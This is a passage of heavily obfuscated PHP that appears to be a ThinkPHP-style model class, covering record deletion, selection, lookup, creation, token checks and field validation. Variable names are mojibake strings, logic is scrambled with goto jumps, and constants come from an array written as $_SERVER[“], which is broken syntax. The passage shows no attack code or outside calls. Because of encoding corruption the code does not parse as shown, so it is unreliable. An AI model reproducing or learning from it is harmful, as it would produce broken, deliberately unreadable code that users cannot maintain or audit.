$EéíÏôÒ[$fÛ„ë—ÆÊ]; $aù¶ ù„¦¦[$dÊ÷ºÚœ–Õ[263]] = $Dìê³÷Å½; unset($EéíÏôÒ[$fÛ„ë—ÆÊ]); } else { $this->error = think_lang($dÊ÷ºÚœ–Õ[262]); return !1; } } goto féÉ“¿»•«; fˆ±ïƒÛ×È: } protected function _beforeUpdate(&$B¿¹æñæˆ, $A¼Íó÷Ğºæ) { } protected function _afterUpdate($FñšˆßìÛÜ, $FÍ¢ªÊöÛ) { } public function delete($c•¡ã…„È´ = array()) { goto C•¡ê÷ÈÊï; CÌ¾‹‘‘Ôñ: if (is_numeric($c•¡ã…„È´) || is_string($c•¡ã…„È´)) { if (strpos($c•¡ã…„È´, $cÅÎä•Ùë[47])) { $cˆ•ŒäÏÀŠ[$A×‡ÚßÄÀ] = array($cÅÎä•Ùë[264], $c•¡ã…„È´); } else { $cˆ•ŒäÏÀŠ[$A×‡ÚßÄÀ] = $c•¡ã…„È´; } $this->options[$cÅÎä•Ùë[263]] = $cˆ•ŒäÏÀŠ; } $c•¡ã…„È´ = $this->_parseOptions(); if (is_array($c•¡ã…„È´[$cÅÎä•Ùë[263]]) && isset($c•¡ã…„È´[$cÅÎä•Ùë[263]][$A×‡ÚßÄÀ])) { $B¡Ò“§Ò® = $c•¡ã…„È´[$cÅÎä•Ùë[263]][$A×‡ÚßÄÀ]; } goto D¥æ÷³°å‚; D¥æ÷³°å‚: $dƒôÉ°‰çÎ = $this->db->delete($c•¡ã…„È´); if (!1 !== $dƒôÉ°‰çÎ) { $BÃÅ®Åƒ¸¡ = array(); if (isset($B¡Ò“§Ò®)) { $BÃÅ®Åƒ¸¡[$A×‡ÚßÄÀ] = $B¡Ò“§Ò®; } $this->_after_delete($BÃÅ®Åƒ¸¡, $c•¡ã…„È´); } return $dƒôÉ°‰çÎ; goto Aä……ŒÚ‚’; C•¡ê÷ÈÊï: $cÅÎä•Ùë =& $_SERVER[“]; if (empty($c•¡ã…„È´) && empty($this->options[$cÅÎä•Ùë[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $A×‡ÚßÄÀ = $this->getPk(); goto CÌ¾‹‘‘Ôñ; Aä……ŒÚ‚’: } protected function _after_delete($F«·‡÷³ßŒ, $AíĞ‰öšøÍ) { } public function select($a¤ê™ÙÑÒ = array()) { goto bˆ‹×‰„ŒÕ; bèÕœ†»«£: $eÓÏŒ¼èĞª = $this->db->select($a¤ê™ÙÑÒ); if (!1 === $eÓÏŒ¼èĞª) { return !1; } if (empty($eÓÏŒ¼èĞª)) { return null; } goto aºÕËõ°‹; aºÕËõ°‹: $this->_afterSelect($eÓÏŒ¼èĞª, $a¤ê™ÙÑÒ); return $eÓÏŒ¼èĞª; goto D®ÛÊÔùØ¬; bˆ‹×‰„ŒÕ: $cøÎæäƒ¤ =& $_SERVER[“]; if (is_string($a¤ê™ÙÑÒ) || is_numeric($a¤ê™ÙÑÒ)) { $d…©ÉëÔ½³ = $this->getPk(); if (strpos($a¤ê™ÙÑÒ, $cøÎæäƒ¤[47])) { $CÛ¯ ÑÜßÕ[$d…©ÉëÔ½³] = array($cøÎæäƒ¤[264], $a¤ê™ÙÑÒ); } else { $CÛ¯ ÑÜßÕ[$d…©ÉëÔ½³] = $a¤ê™ÙÑÒ; } $this->options[$cøÎæäƒ¤[263]] = $CÛ¯ ÑÜßÕ; } elseif (!1 === $a¤ê™ÙÑÒ) { $a¤ê™ÙÑÒ = $this->_parseOptions(); return $cøÎæäƒ¤[265] . $this->db->buildSelectSql($a¤ê™ÙÑÒ) . $cøÎæäƒ¤[266]; } $a¤ê™ÙÑÒ = $this->_parseOptions(); goto bèÕœ†»«£; D®ÛÊÔùØ¬: } protected function _afterSelect(&$Cİ×‘óÎ’Ş, $b³™îÎñ›¼) { } public function buildSql($Bà¿½Ä…¯Ä = array()) { $a´–»æ =& $_SERVER[“]; $Bà¿½Ä…¯Ä = $this->_parseOptions($Bà¿½Ä…¯Ä); return $a´–»æ[265] . $this->db->buildSelectSql($Bà¿½Ä…¯Ä) . $a´–»æ[266]; } public function optionsValue($Cª—¤àëá‹ = null) { if (is_null($Cª—¤àëá‹)) { return $this->options; } elseif (is_array($Cª—¤àëá‹)) { $this->options = array_merge($this->options, $Cª—¤àëá‹); } } protected function _parseOptions($eİŒ”§˜  = array()) { goto dß¬’§ƒÄ; C³“Èëº: if (!isset($eİŒ”§˜ [$e¾¬…¦¿µê[267]])) { $eİŒ”§˜ [$e¾¬…¦¿µê[267]] = $this->getTableName(); $A¨ÏÄ—åÌÏ = $this->fields; } else { $A¨ÏÄ—åÌÏ = $this->getDbFields(); } if (!empty($eİŒ”§˜ [$e¾¬…¦¿µê[268]])) { $eİŒ”§˜ [$e¾¬…¦¿µê[267]] .= $e¾¬…¦¿µê[50] . $eİŒ”§˜ [$e¾¬…¦¿µê[268]]; } $eİŒ”§˜ [$e¾¬…¦¿µê[269]] = $this->name; goto E®áÎïáÙİ; E®áÎïáÙİ: if (isset($eİŒ”§˜ [$e¾¬…¦¿µê[263]]) && is_array($eİŒ”§˜ [$e¾¬…¦¿µê[263]]) && !empty($A¨ÏÄ—åÌÏ) && !isset($eİŒ”§˜ [$e¾¬…¦¿µê[270]]) && !isset($eİŒ”§˜ [$e¾¬…¦¿µê[267]])) { foreach ($eİŒ”§˜ [$e¾¬…¦¿µê[263]] as $a¸Œ¨í±ğ => $C™âÔóÖ¡Á) { $a¸Œ¨í±ğ = trim($a¸Œ¨í±ğ); if (in_array($a¸Œ¨í±ğ, $A¨ÏÄ—åÌÏ, !0)) { if (is_scalar($C™âÔóÖ¡Á)) { $this->_parseType($eİŒ”§˜ [$e¾¬…¦¿µê[263]], $a¸Œ¨í±ğ); } } elseif (!is_numeric($a¸Œ¨í±ğ) && $e¾¬…¦¿µê[70] != substr($a¸Œ¨í±ğ, 0, 1) && !1 === strpos($a¸Œ¨í±ğ, $e¾¬…¦¿µê[91]) && !1 === strpos($a¸Œ¨í±ğ, $e¾¬…¦¿µê[248]) && !1 === strpos($a¸Œ¨í±ğ, $e¾¬…¦¿µê[271]) && !1 === strpos($a¸Œ¨í±ğ, $e¾¬…¦¿µê[272])) { unset($eİŒ”§˜ [$e¾¬…¦¿µê[263]][$a¸Œ¨í±ğ]); } } } $this->_options_filter($eİŒ”§˜ ); return $eİŒ”§˜ ; goto DÒ¹Œ”¡ª‹; dß¬’§ƒÄ: $e¾¬…¦¿µê =& $_SERVER[“]; if (is_array($eİŒ”§˜ )) { $eİŒ”§˜  = array_merge($this->options, $eİŒ”§˜ ); } $this->options = array(); goto C³“Èëº; DÒ¹Œ”¡ª‹: } protected function _options_filter(&$B»‘Ü‘Ä¿) { } protected function _parseType(&$Dâñ¢Õ×, $bÁ°ÃˆÙÈà) { $bµ‘‘‘âù• =& $_SERVER[“]; if (empty($this->options[$bµ‘‘‘âù•[273]][$bµ‘‘‘âù•[4] . $bÁ°ÃˆÙÈà])) { $b£ÚøËÅ· = strtolower($this->fields[$bµ‘‘‘âù•[240]][$bÁ°ÃˆÙÈà]); if (!1 !== strpos($b£ÚøËÅ·, $bµ‘‘‘âù•[274])) { } elseif (!1 === strpos($b£ÚøËÅ·, $bµ‘‘‘âù•[275]) && !1 !== strpos($b£ÚøËÅ·, $bµ‘‘‘âù•[276])) { $Dâñ¢Õ×[$bÁ°ÃˆÙÈà] = intval($Dâñ¢Õ×[$bÁ°ÃˆÙÈà]); } elseif (!1 !== strpos($b£ÚøËÅ·, $bµ‘‘‘âù•[277]) || !1 !== strpos($b£ÚøËÅ·, $bµ‘‘‘âù•[278])) { $Dâñ¢Õ×[$bÁ°ÃˆÙÈà] = floatval($Dâñ¢Õ×[$bÁ°ÃˆÙÈà]); } elseif (!1 !== strpos($b£ÚøËÅ·, $bµ‘‘‘âù•[279])) { $Dâñ¢Õ×[$bÁ°ÃˆÙÈà] = (bool) $Dâñ¢Õ×[$bÁ°ÃˆÙÈà]; } } } public function find($b†²õ•‘ = array()) { goto fÑÑË¿§¶ä; C¶ÂÍ–âàñ: $b†²õ•‘ = $this->_parseOptions(); $A®–ö©ŸäË = $this->db->select($b†²õ•‘); if (!1 === $A®–ö©ŸäË) { return !1; } goto A‡âİ±Ş•‹; c½‘øÕœçì: if (!empty($this->options[$d³ÀŸë•¯‹[281]])) { return $this->returnResult($this->data, $this->options[$d³ÀŸë•¯‹[281]]); } return $this->data; goto eê¦„³æéí; A‡âİ±Ş•‹: if (empty($A®–ö©ŸäË)) { return null; } $this->data = $A®–ö©ŸäË[0]; $this->_afterFind($this->data, $b†²õ•‘); goto c½‘øÕœçì; fÑÑË¿§¶ä: $d³ÀŸë•¯‹ =& $_SERVER[“]; if (is_numeric($b†²õ•‘) || is_string($b†²õ•‘)) { $Fİù¡”×¸Ï[$this->getPk()] = intval($b†²õ•‘); $this->options[$d³ÀŸë•¯‹[263]] = $Fİù¡”×¸Ï; } $this->options[$d³ÀŸë•¯‹[280]] = 1; goto C¶ÂÍ–âàñ; eê¦„³æéí: } protected function _afterFind(&$fÕÃ¬ƒ´¼•, $f‚‹†ˆÊè) { } protected function returnResult($FÌ§ÃÙÂÜ°, $F‡†øÒ³•ã = '') { $Aï°•®ºÚ =& $_SERVER[“]; if ($F‡†øÒ³•ã) { if (is_callable($F‡†øÒ³•ã)) { return call_user_func($F‡†øÒ³•ã, $FÌ§ÃÙÂÜ°); } switch (strtolower($F‡†øÒ³•ã)) { case $Aï°•®ºÚ[282]: return json_encode($FÌ§ÃÙÂÜ°); case $Aï°•®ºÚ[283]: return xml_encode($FÌ§ÃÙÂÜ°); } } return $FÌ§ÃÙÂÜ°; } public function parseFieldsMap($f›²”ÒóÇ˜, $F™“„¶¡Ã = 1) { if (!empty($this->_map)) { foreach ($this->_map as $C¼Å–½ñØ => $D¹İĞ…Ã) { if ($F™“„¶¡Ã == 1) { if (isset($f›²”ÒóÇ˜[$D¹İĞ…Ã])) { $f›²”ÒóÇ˜[$C¼Å–½ñØ] = $f›²”ÒóÇ˜[$D¹İĞ…Ã]; unset($f›²”ÒóÇ˜[$D¹İĞ…Ã]); } } else { if (isset($f›²”ÒóÇ˜[$C¼Å–½ñØ])) { $f›²”ÒóÇ˜[$D¹İĞ…Ã] = $f›²”ÒóÇ˜[$C¼Å–½ñØ]; unset($f›²”ÒóÇ˜[$C¼Å–½ñØ]); } } } } return $f›²”ÒóÇ˜; } public function setField($DèÙ×´—öˆ, $A»ì„ƒéëÑ = '') { if (is_array($DèÙ×´—öˆ)) { $få±‚ÍŠ†¼ = $DèÙ×´—öˆ; } else { $få±‚ÍŠ†¼[$DèÙ×´—öˆ] = $A»ì„ƒéëÑ; } return $this->save($få±‚ÍŠ†¼); } public function setAdd($D’òÑÆœˆ, $c½ñ˜†Ó©Â = 1) { $B¸³­ä³í¸ =& $_SERVER[“]; $fÉ¹çâ÷ßÏ = $D’òÑÆœˆ . $B¸³­ä³í¸[284] . $c½ñ˜†Ó©Â; if ($c½ñ˜†Ó©Â < 0) { $fÉ¹çâ÷ßÏ = $D’òÑÆœˆ . $c½ñ˜†Ó©Â; } return $this->setField($D’òÑÆœˆ, array($B¸³­ä³í¸[285], $fÉ¹çâ÷ßÏ)); } public function getField($eÎ» ¦„äƒ, $B¦æõĞö¾» = null) { $DÄ‘Ààãô‰ =& $_SERVER[“]; $cçÑµ……§Â[$DÄ‘Ààãô‰[261]] = $eÎ» ¦„äƒ; $cçÑµ……§Â = $this->_parseOptions($cçÑµ……§Â); $eÎ» ¦„äƒ = trim($eÎ» ¦„äƒ); if (strpos($eÎ» ¦„äƒ, $DÄ‘Ààãô‰[47])) { if (!isset($cçÑµ……§Â[$DÄ‘Ààãô‰[280]])) { $cçÑµ……§Â[$DÄ‘Ààãô‰[280]] = is_numeric($B¦æõĞö¾») ? $B¦æõĞö¾» : $DÄ‘Ààãô‰[33]; } $CíâÕœ†ïŸ = $this->db->select($cçÑµ……§Â); if (!empty($CíâÕœ†ïŸ)) { goto b¬Îéõ­; b¬Îéõ­: $B›©Øª† = explode($DÄ‘Ààãô‰[47], $eÎ» ¦„äƒ); $eÎ» ¦„äƒ = array_keys($CíâÕœ†ïŸ[0]); $CÛªÃ•‹› = array_shift($eÎ» ¦„äƒ); goto Aæ­¿¡½Êà; Aæ­¿¡½Êà: $fÕ’ÀÂÙºæ = array_shift($eÎ» ¦„äƒ); $Dµ¹‘ìó² = array(); $A¡ö×ª‰ = count($B›©Øª†); goto aøÌÆ„Š½; aøÌÆ„Š½: foreach ($CíâÕœ†ïŸ as $F«ÊÚ…ÁÔ) { $AÚé±Åøßƒ = $F«ÊÚ…ÁÔ[$CÛªÃ•‹›]; if (2 == $A¡ö×ª‰) { $Dµ¹‘ìó²[$AÚé±Åøßƒ] = $F«ÊÚ…ÁÔ[$fÕ’ÀÂÙºæ]; } else { $Dµ¹‘ìó²[$AÚé±Åøßƒ] = is_string($B¦æõĞö¾») ? implode($B¦æõĞö¾», $F«ÊÚ…ÁÔ) : $F«ÊÚ…ÁÔ; } } return $Dµ¹‘ìó²; goto d¬Õ‚ö‘†Ë; d¬Õ‚ö‘†Ë: } } else { if (!0 !== $B¦æõĞö¾») { $cçÑµ……§Â[$DÄ‘Ààãô‰[280]] = is_numeric($B¦æõĞö¾») ? $B¦æõĞö¾» : 1; } if ($B¦æõĞö¾» === $DÄ‘Ààãô‰[243]) { unset($cçÑµ……§Â[$DÄ‘Ààãô‰[280]]); } $F«ÊÚ…ÁÔ = $this->db->select($cçÑµ……§Â); if (!empty($F«ÊÚ…ÁÔ)) { if ($B¦æõĞö¾» === $DÄ‘Ààãô‰[243]) { return reset($F«ÊÚ…ÁÔ[0]); } if (!0 !== $B¦æõĞö¾» && 1 == $cçÑµ……§Â[$DÄ‘Ààãô‰[280]]) { return reset($F«ÊÚ…ÁÔ[0]); } foreach ($F«ÊÚ…ÁÔ as $DñÜëğ) { $cßÒÀáÒ¾ò[] = $DñÜëğ[$eÎ» ¦„äƒ]; } return $cßÒÀáÒ¾ò; } } return null; } public function create($A‡ÄùøÙù» = '', $A˜¹Ö‡§¼å = '') { goto b½Î®Ã¡â†; BˆÇ™‚Ìñ: if ($this->autoCheckFields) { $Eˆ®‡Ø«ø® = $this->getDbFields(); foreach ($A‡ÄùøÙù» as $bçóê£èœß => $f¨É¯Ëä¡µ) { if (!in_array($bçóê£èœß, $Eˆ®‡Ø«ø®)) { unset($A‡ÄùøÙù»[$bçóê£èœß]); } elseif (MAGIC_QUOTES_GPC && is_string($f¨É¯Ëä¡µ)) { $A‡ÄùøÙù»[$bçóê£èœß] = stripslashes($f¨É¯Ëä¡µ); } } } $this->autoOperation($A‡ÄùøÙù», $A˜¹Ö‡§¼å); $this->data = $A‡ÄùøÙù»; goto D¤‰Û¾‘˜; dô˜Ğ†Œ˜¥: $A‡ÄùøÙù» = $this->parseFieldsMap($A‡ÄùøÙù», 0); $A˜¹Ö‡§¼å = $A˜¹Ö‡§¼å ? $A˜¹Ö‡§¼å : (!empty($A‡ÄùøÙù»[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$e…®ƒ­±í³[261]])) { $Eˆ®‡Ø«ø® = $this->options[$e…®ƒ­±í³[261]]; unset($this->options[$e…®ƒ­±í³[261]]); } elseif ($A˜¹Ö‡§¼å == THINK_MODEL_INSERT && isset($this->insertFields)) { $Eˆ®‡Ø«ø® = $this->insertFields; } elseif ($A˜¹Ö‡§¼å == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Eˆ®‡Ø«ø® = $this->updateFields; } goto f½ò–Ú‰Çï; b½Î®Ã¡â†: $e…®ƒ­±í³ =& $_SERVER[“]; if (empty($A‡ÄùøÙù»)) { $A‡ÄùøÙù» = $_POST; } elseif (is_object($A‡ÄùøÙù»)) { $A‡ÄùøÙù» = get_object_vars($A‡ÄùøÙù»); } if (empty($A‡ÄùøÙù») || !is_array($A‡ÄùøÙù»)) { $this->error = think_lang($e…®ƒ­±í³[259]); return !1; } goto dô˜Ğ†Œ˜¥; D¤‰Û¾‘˜: return $A‡ÄùøÙù»; goto Dâ“¯¶˜¼÷; f½ò–Ú‰Çï: if (isset($Eˆ®‡Ø«ø®)) { if (is_string($Eˆ®‡Ø«ø®)) { $Eˆ®‡Ø«ø® = explode($e…®ƒ­±í³[47], $Eˆ®‡Ø«ø®); } if (think_config($e…®ƒ­±í³[286])) { $Eˆ®‡Ø«ø®[] = think_config($e…®ƒ­±í³[287]); } foreach ($A‡ÄùøÙù» as $bçóê£èœß => $f¨É¯Ëä¡µ) { if (!in_array($bçóê£èœß, $Eˆ®‡Ø«ø®)) { unset($A‡ÄùøÙù»[$bçóê£èœß]); } } } if (!$this->autoValidation($A‡ÄùøÙù», $A˜¹Ö‡§¼å)) { return !1; } if (!$this->autoCheckToken($A‡ÄùøÙù»)) { $this->error = think_lang($e…®ƒ­±í³[288]); return !1; } goto BˆÇ™‚Ìñ; Dâ“¯¶˜¼÷: } public function autoCheckToken($EÛ…–ëÍëå) { $aÖÓù òÉô =& $_SERVER[“]; if (isset($this->options[$aÖÓù òÉô[289]]) && !$this->options[$aÖÓù òÉô[289]]) { return !0; } if (think_config($aÖÓù òÉô[286])) { $D¢ˆ²¾¸  = think_config($aÖÓù òÉô[287]); if (!isset($EÛ…–ëÍëå[$D¢ˆ²¾¸ ]) || Session::get($D¢ˆ²¾¸ )) { return !1; } list($e’ˆã÷Â™, $A›²Ä²šö) = explode($aÖÓù òÉô[70], $EÛ…–ëÍëå[$D¢ˆ²¾¸ ]); if ($A›²Ä²šö && Session::get($D¢ˆ²¾¸  . $aÖÓù òÉô[91] . $e’ˆã÷Â™) === $A›²Ä²šö) { Session::remove($D¢ˆ²¾¸  . $aÖÓù òÉô[91] . $e’ˆã÷Â™); return !0; } if (think_config($aÖÓù òÉô[290])) { Session::remove($D¢ˆ²¾¸  . $aÖÓù òÉô[91] . $e’ˆã÷Â™); } return !1; } return !0; } public function regex($eÈ‡õ©–É, $d”ø“Âƒ¥) { $b°ŞÀÄÖ×ª =& $_SERVER[“]; $bê¢‡ë†Ç = array($b°ŞÀÄÖ×ª[291] => $b°ŞÀÄÖ×ª[292], $b°ŞÀÄÖ×ª[293] => $b°ŞÀÄÖ×ª[294], $b°ŞÀÄÖ×ª[295] => $b°ŞÀÄÖ×ª[296], $b°ŞÀÄÖ×ª[297] => $b°ŞÀÄÖ×ª[298], $b°ŞÀÄÖ×ª[299] => $b°ŞÀÄÖ×ª[300], $b°ŞÀÄÖ×ª[301] => $b°ŞÀÄÖ×ª[302], $b°ŞÀÄÖ×ª[303] => $b°ŞÀÄÖ×ª[304], $b°ŞÀÄÖ×ª[278] => $b°ŞÀÄÖ×ª[305], $b°ŞÀÄÖ×ª[306] => $b°ŞÀÄÖ×ª[307]); if (isset($bê¢‡ë†Ç[strtolower($d”ø“Âƒ¥)])) { $d”ø“Âƒ¥ = $bê¢‡ë†Ç[strtolower($d”ø“Âƒ¥)]; } return preg_match($d”ø“Âƒ¥, $eÈ‡õ©–É) === 1; } private function autoOperation(&$d¯Â°¿¿, $DšØóÆŞ÷) { $d¬Ğ„••°¡ =& $_SERVER[“]; if (!empty($this->options[$d¬Ğ„••°¡[308]])) { $fÁÇ÷‹¬â¼ = $this->options[$d¬Ğ„••°¡[308]]; unset($this->options[$d¬Ğ„••°¡[308]]); } elseif (!empty($this->_auto)) { $fÁÇ÷‹¬â¼ = $this->_auto; } if (isset($fÁÇ÷‹¬â¼)) { foreach ($fÁÇ÷‹¬â¼ as $A¿œ–¥¶ï) { if (empty($A¿œ–¥¶ï[2])) { $A¿œ–¥¶ï[2] = THINK_MODEL_INSERT; } if ($DšØóÆŞ÷ == $A¿œ–¥¶ï[2] || $A¿œ–¥¶ï[2] == THINK_MODEL_BOTH) { switch (trim($A¿œ–¥¶ï[3])) { case $d¬Ğ„••°¡[309]: case $d¬Ğ„••°¡[310]: $b’¤¸ÃÇë§ = isset($A¿œ–¥¶ï[4]) ? (array) $A¿œ–¥¶ï[4] : array(); if (isset($d¯Â°¿¿[$A¿œ–¥¶ï[0]])) { array_unshift($b’¤¸ÃÇë§, $d¯Â°¿¿[$A¿œ–¥¶ï[0]]); } if ($d¬Ğ„••°¡[309] == $A¿œ–¥¶ï[3]) { $d¯Â°¿¿[$A¿œ–¥¶ï[0]] = call_user_func_array($A¿œ–¥¶ï[1], $b’¤¸ÃÇë§); } else { $d¯Â°¿¿[$A¿œ–¥¶ï[0]] = call_user_func_array(array(&$this, $A¿œ–¥¶ï[1]), $b’¤¸ÃÇë§); } break; case $d¬Ğ„••°¡[261]: $d¯Â°¿¿[$A¿œ–¥¶ï[0]] = $d¯Â°¿¿[$A¿œ–¥¶ï[1]]; break; case $d¬Ğ„••°¡[311]: if ($d¬Ğ„••°¡[33] === $d¯Â°¿¿[$A¿œ–¥¶ï[0]]) { unset($d¯Â°¿¿[$A¿œ–¥¶ï[0]]); } break; case $d¬Ğ„••°¡[312]: default: $d¯Â°¿¿[$A¿œ–¥¶ï[0]] = $A¿œ–¥¶ï[1]; } if (!1 === $d¯Â°¿¿[$A¿œ–¥¶ï[0]]) { unset($d¯Â°¿¿[$A¿œ–¥¶ï[0]]); } } } } return $d¯Â°¿¿; } protected function autoValidation($cÂ”“„ãİ», $F•âÜ¥ˆ¤) { $e¶¡ÛÉ‘‹ =& $_SERVER[“]; if (!empty($this->options[$e¶¡ÛÉ‘‹[313]])) { $DÎÆœî¦¾È = $this->options[$e¶¡ÛÉ‘‹[313]]; unset($this->options[$e¶¡ÛÉ‘‹[313]]); } elseif (!empty($this->_validate)) { $DÎÆœî¦¾È = $this->_validate; } if (isset($DÎÆœî¦¾È)) { if ($this->patchValidate) { $this->error = array(); } foreach ($DÎÆœî¦¾È as $A¸îÃõøÀ’ => $e¥ÉîèÇ„¶) { if (empty($e¥ÉîèÇ„¶[5]) || $e¥ÉîèÇ„¶[5] == THINK_MODEL_BOTH || $e¥ÉîèÇ„¶[5] == $F•âÜ¥ˆ¤) { if (0 == strpos($e¥ÉîèÇ„¶[2], $e¶¡ÛÉ‘‹[314]) && strpos($e¥ÉîèÇ„¶[2], $e¶¡ÛÉ‘‹[315])) { $e¥ÉîèÇ„¶[2] = think_lang(substr($e¥ÉîèÇ„¶[2], 2, -1)); } $e¥ÉîèÇ„¶[3] = isset($e¥ÉîèÇ„¶[3]) ? $e¥ÉîèÇ„¶[3] : THINK_EXISTS_VALIDATE; $e¥ÉîèÇ„¶[4] = isset($e¥ÉîèÇ„¶[4]) ? $e¥ÉîèÇ„¶[4] : $e¶¡ÛÉ‘‹[316]; switch ($e¥ÉîèÇ„¶[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($cÂ”“„ãİ», $e¥ÉîèÇ„¶)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($e¶¡ÛÉ‘‹[33] != trim($cÂ”“„ãİ»[$e¥ÉîèÇ„¶[0]])) { if (!1 === $this->_validationField($cÂ”“„ãİ», $e¥ÉîèÇ„¶)) { return !1; } } break; default: if (isset($cÂ”“„ãİ»[$e¥ÉîèÇ„¶[0]])) { if (!1 === $this->_validationField($cÂ”“„ãİ», $e¥ÉîèÇ„¶)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($e¦âôøÁÑŠ, $F„ìï¡š´²) { if (!1 === $this->_validationFieldItem($e¦âôøÁÑŠ, $F„ìï¡š´²)) { if ($this->patchValidate) { $this->error[$F„ìï¡š´²[0]] = $F„ìï¡š´²[2]; } else { $this->error = $F„ìï¡š´²[2]; return !1; } } return; } protected function _validationFieldItem($bÄ‘©ñ›—‡, $e‹Ä‹ó”“Î) { $eÅ²­À¨ƒš =& $_SERVER[“]; switch (strtolower(trim($e‹Ä‹ó”“Î[4]))) { case $eÅ²­À¨ƒš[309]: case $eÅ²­À¨ƒš[310]: $E÷ŠŠÅ±¦ = isset($e‹Ä‹ó”“Î[6]) ? (array) $e‹Ä‹ó”“Î[6] : array(); if (is_string($e‹Ä‹ó”“Î[0]) && strpos($e‹Ä‹ó”“Î[0], $eÅ²­À¨ƒš[47])) { $e‹Ä‹ó”“Î[0] = explode($eÅ²­À¨ƒš[47], $e‹Ä‹ó”“Î[0]); } if (is_array($e‹Ä‹ó”“Î[0])) { foreach ($e‹Ä‹ó”“Î[0] as $d„ßŒëÎ¿) { $bÀîâ¥Ê½Ô[$d„ßŒëÎ¿] = $bÄ‘©ñ›—‡[$d„ßŒëÎ¿]; } array_unshift($E÷ŠŠÅ±¦, $bÀîâ¥Ê½Ô); } else { array_unshift($E÷ŠŠÅ±¦, $bÄ‘©ñ›—‡[$e‹Ä‹ó”“Î[0]]); } if ($eÅ²­À¨ƒš[309] == $e‹Ä‹ó”“Î[4]) { return call_user_func_array($e‹Ä‹ó”“Î[1], $E÷ŠŠÅ±¦); } else { return call_user_func_array(array(&$this, $e‹Ä‹ó”“Î[1]), $E÷ŠŠÅ±¦); } case $eÅ²­À¨ƒš[317]: return $bÄ‘©ñ›—‡[$e‹Ä‹ó”“Î[0]] == $bÄ‘©ñ›—‡[$e‹Ä‹ó”“Î[1]]; case $eÅ²­À¨ƒš[318]: if (is_string($e‹Ä‹ó”“Î[0]) && strpos($e‹Ä‹ó”“Î[0], $eÅ²­À¨ƒš[47])) { $e‹Ä‹ó”“Î[0] = explode($eÅ²­À¨ƒš[47], $e‹Ä‹ó”“Î[0]); } $fËİŞ©Ÿ®ù = array(); if (is_array($e‹Ä‹ó”“Î[0])) { foreach ($e‹Ä‹ó”“Î[0] as $d„ßŒëÎ¿) { $fËİŞ©Ÿ®ù[$d„ßŒëÎ¿] = $bÄ‘©ñ›—‡[$d„ßŒëÎ¿]; } } else { $fËİŞ©Ÿ®ù[$e‹Ä‹ó”“Î[0]] = $bÄ‘©ñ›—‡[$e‹Ä‹ó”“Î[0]]; } if (!empty($bÄ‘©ñ›—‡[$this->getPk()])) { $fËİŞ©Ÿ®ù[$this->getPk()] = array($eÅ²­À¨ƒš[319], $bÄ‘©ñ›—‡[$this->getPk()]); } if ($this->where($fËİŞ©Ÿ®ù)->find()) { return !1; } return !0; default: return $this->check($bÄ‘©ñ›—‡[$e‹Ä‹ó”“Î[0]], $e‹Ä‹ó”“Î[1], $e‹Ä‹ó”“Î[4]); } } public function check($eˆèŠÙæ, $BÅßÌÎ¦Ã, $dŠÀ²‘÷÷· = "\162\x65\x67\145\170") { $EÌÍïŞ‹®‹ =& $_SERVER[“]; $dŠÀ²‘÷÷· = strtolower(trim($dŠÀ²‘÷÷·)); switch ($dŠÀ²‘÷÷·) { case $EÌÍïŞ‹®‹[7]: case $EÌÍïŞ‹®‹[320]: $Aù‰àÚêø = is_array($BÅßÌÎ¦Ã) ? $BÅßÌÎ¦Ã : explode($EÌÍïŞ‹®‹[47], $BÅßÌÎ¦Ã); return $dŠÀ²‘÷÷· == $EÌÍïŞ‹®‹[7] ? in_array($eˆèŠÙæ, $Aù‰àÚêø) : !in_array($eˆèŠÙæ, $Aù‰àÚêø); case $EÌÍïŞ‹®‹[321]: case $EÌÍïŞ‹®‹[322]: if (is_array($BÅßÌÎ¦Ã)) { $bƒÁëİê­³ = $BÅßÌÎ¦Ã[0]; $f¨Ã„ÕÖ÷ = $BÅßÌÎ¦Ã[1]; } else { list($bƒÁëİê­³, $f¨Ã„ÕÖ÷) = explode($EÌÍïŞ‹®‹[47], $BÅßÌÎ¦Ã); } return $dŠÀ²‘÷÷· == $EÌÍïŞ‹®‹[321] ? $eˆèŠÙæ >= $bƒÁëİê­³ && $eˆèŠÙæ <= $f¨Ã„ÕÖ÷ : $eˆèŠÙæ < $bƒÁëİê­³ || $eˆèŠÙæ > $f¨Ã„ÕÖ÷; case $EÌÍïŞ‹®‹[323]: case $EÌÍïŞ‹®‹[324]: return $dŠÀ²‘÷÷· == $EÌÍïŞ‹®‹[323] ? $eˆèŠÙæ == $BÅßÌÎ¦Ã : $eˆèŠÙæ != $BÅßÌÎ¦Ã; case $EÌÍïŞ‹®‹[325]: $Bï²«Ñ‡ˆ§ = mb_strlen($eˆèŠÙæ, $EÌÍïŞ‹®‹[326]); if (strpos($BÅßÌÎ¦Ã, $EÌÍïŞ‹®‹[47])) { list($bƒÁëİê­³, $f¨Ã„ÕÖ÷) = explode($EÌÍïŞ‹®‹[47], $BÅßÌÎ¦Ã); return $Bï²«Ñ‡ˆ§ >= $bƒÁëİê­³ && $Bï²«Ñ‡ˆ§ <= $f¨Ã„ÕÖ÷; } else { return $Bï²«Ñ‡ˆ§ == $BÅßÌÎ¦Ã; } case $EÌÍïŞ‹®‹[327]: list($aí÷î‹èá¸, $eÔ¢¬¡’Ù™) = explode($EÌÍïŞ‹®‹[47], $BÅßÌÎ¦Ã); if (!is_numeric($aí÷î‹èá¸)) { $aí÷î‹èá¸ = strtotime($aí÷î‹èá¸); } if (!is_numeric($eÔ¢¬¡’Ù™)) { $eÔ¢¬¡’Ù™ = strtotime($eÔ¢¬¡’Ù™); } return NOW_TIME >= $aí÷î‹èá¸ && NOW_TIME <= $eÔ¢¬¡’Ù™; case $EÌÍïŞ‹®‹[328]: return in_array(get_client_ip(), explode($EÌÍïŞ‹®‹[47], $BÅßÌÎ¦Ã)); case $EÌÍïŞ‹®‹[329]: return !in_array(get_client_ip(), explode($EÌÍïŞ‹®‹[47], $BÅßÌÎ¦Ã)); case $EÌÍïŞ‹®‹[316]: default: return $this->regex($eˆèŠÙæ, $BÅßÌÎ¦Ã); } } public function query($DÇÏ…‡Ş‡Å, $f‰â‰îÆçğ = false) { $EåÛö÷¿ä =& $_SERVER[“]; if 